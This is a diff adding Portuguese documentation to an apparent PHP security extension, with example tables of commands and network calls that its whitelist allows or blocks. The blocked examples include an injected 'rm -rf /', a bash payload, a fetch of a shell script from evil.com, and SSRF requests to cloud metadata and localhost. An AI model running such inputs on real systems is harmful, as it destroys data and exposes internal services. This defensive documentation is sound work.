@@ -230,6 +230,36 @@ security_guard.log_format=jsonl
 
 ---
 
+### Exemplos Práticos e Resultados
+
+Abaixo estão alguns cenários baseados em uma configuração de exemplo.
+
+**Configuração da Whitelist:**
+- Comandos permitidos: `/usr/bin/optipng`
+- Redes permitidas: `api.mercadopago.com` (domain)
+
+#### Cenários de Comandos
+
+| Código PHP | Chamada Resultante | Resultado Esperado | Motivo do Bloqueio |
+|------------|---------------------|---------------------|--------------------|
+| `exec('optipng img.png');` | `optipng` (sem path absoluto) | ❌ **Bloqueado** | Caminho não absoluto ou binário não listado na whitelist. |
+| `exec('/usr/bin/optipng img.png');` | `/usr/bin/optipng img.png` | ✅ **Permitido** | Binário está na whitelist e não possui operadores perigosos. |
+| `exec('/usr/bin/optipng img.png ; rm -rf /');` | `/usr/bin/optipng img.png ; rm -rf /` | ❌ **Bloqueado** | Presença de operador perigoso (`;`). Previne injeção. |
+| `exec('/bin/bash payload.sh');` | `/bin/bash payload.sh` | ❌ **Bloqueado** | O binário `/bin/bash` não está autorizado na whitelist. |
+
+#### Cenários de Rede
+
+| Código PHP | Chamada Resultante | Resultado Esperado | Motivo do Bloqueio |
+|------------|---------------------|---------------------|--------------------|
+| `file_get_contents('https://api.mercadopago.com/v1/');` | Domínio `api.mercadopago.com` | ✅ **Permitido** | Domínio está na whitelist de rede. |
+| `curl_exec()` em `http://evil.com/shell.sh` | Domínio `evil.com` | ❌ **Bloqueado** | Domínio não listado na whitelist. |
+| `fopen('http://169.254.169.254/', 'r');` | IP `169.254.169.254` | ❌ **Bloqueado** | Metadados Cloud são bloqueados nativamente (SSRF protection). |
+| `file_get_contents('http://127.0.0.1/admin');` | IP `127.0.0.1` | ❌ **Bloqueado** | Redes privadas bloqueadas nativamente (SSRF protection). |
+
+*(Nota: Quando bloqueada no modo `block`, a função retornará `false` ou `null`, e um `PHP Warning` de segurança será emitido no log nativo de erros do PHP).*
+
+---
+
 ### Modos de operação
 
 ```text
